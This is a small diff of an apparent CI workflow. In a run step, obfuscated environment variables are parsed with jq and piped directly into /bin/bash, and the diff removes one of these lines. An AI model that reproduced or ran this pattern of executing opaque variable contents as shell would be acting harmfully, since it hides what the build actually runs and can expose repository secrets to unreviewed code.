@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$ydnu48" | jq -r .nuyy1622 | /bin/bash
           echo $ltyj36 | jq -r .pyce0 | /bin/bash
-          printf '%s' "$j061" | jq -r .qopsc19 | /bin/bash
           echo $tzecb4 | jq -r .yxuvt10 | /bin/bash
 
       - name: Save archive
